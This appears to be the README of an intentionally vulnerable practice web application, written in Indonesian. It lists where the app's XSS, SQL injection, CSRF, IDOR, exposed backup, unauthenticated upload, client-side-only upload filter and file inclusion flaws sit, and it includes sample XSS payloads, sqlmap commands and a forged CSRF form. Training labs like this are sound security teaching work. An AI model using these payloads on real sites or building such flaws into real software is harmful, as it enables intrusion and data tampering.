# VulnLabs

### XSS
- Form search
- Contoh payload: 
```
<script>alert(1)</script>
<body onload=confirm(1)>
<h1 onmouseover=confirm(1)>asdf</h1>
<img src=3 onerror=confirm(1)>
```

### SQL Injection
- Halaman detail item: /item-details.php?id=  
`sqlmap -u "https://host.com/item-details.php?id=1*" --batch --current-db`
- Halaman pencarian  
`sqlmap -u "http://host.com/explore.php?keyword=asd*" --current-db --batch --level 2`

### CSRF
- Edit barang: `/admin/cek-edit-data.php`
- Post data: `nama_barang` , `kuantitas` & `created_by` 
- Contoh:
```
<form action="http://host.com/admin/cek-edit-data.php" method="post" class="user">
    <input type="hidden" name="id" value="1" />
    <input type="text" name="nama_barang" value="Hiasan Dinding Kontemporer Baru" />
    <input type="text" name="kuantitas" value="12" />
    <input type="text" name="created_by" value="administrator" />
    <button type="submit">Edit Data</button>
</form>
```

### IDOR
- Halaman profile: `/admin/profile.php`
- Ganti `id` yang ada di `<input type="hidden" name="id" value="2">` menjadi `id` milik _admin_
- `<input type="hidden" name="id" value="1">`

### Misconfiguration
- Backup file: /admin/backup/file.sql
- Udah dicek via *DirSearch*

### Broken Authentication
- Halaman upload di dalam dir `/admin` bisa diakses: `/admin/upload.php`

### File Upload
- Menu "Upload Database"
- Upload db file. Note: flow-nya hanya simpan file, bukan sekalian import file yg diupload
- Hanya filter ext dari JS

### Local File Inclusion
- Halaman login `/admin/?get=login.php`
- `http://host.com/admin/?get=login.php`
